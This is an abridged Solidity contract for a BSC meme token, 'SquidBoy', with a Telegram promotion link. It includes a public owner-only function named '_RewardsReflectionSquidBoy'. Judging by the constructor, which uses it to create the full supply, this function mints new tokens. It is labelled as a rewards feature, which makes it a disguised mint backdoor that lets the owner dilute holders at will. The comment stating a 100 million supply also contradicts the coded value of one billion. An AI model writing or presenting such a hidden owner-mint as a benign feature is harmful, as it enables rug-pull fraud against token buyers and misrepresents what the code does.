...
//
// $SquidBoy proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/SquidBoyBSC
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _RewardsReflectionSquidBoy(uint256 amount) public onlyOwner {
    _RewardsReflectionSquidBoy(msg.sender, amount);
    }
    ...
    function _RewardsReflectionSquidBoy(address account, uint256 amount) internal virtual {
...
contract SquidBoy is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Squid Boy ", "SquidBoy") {
        _RewardsReflectionSquidBoy(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}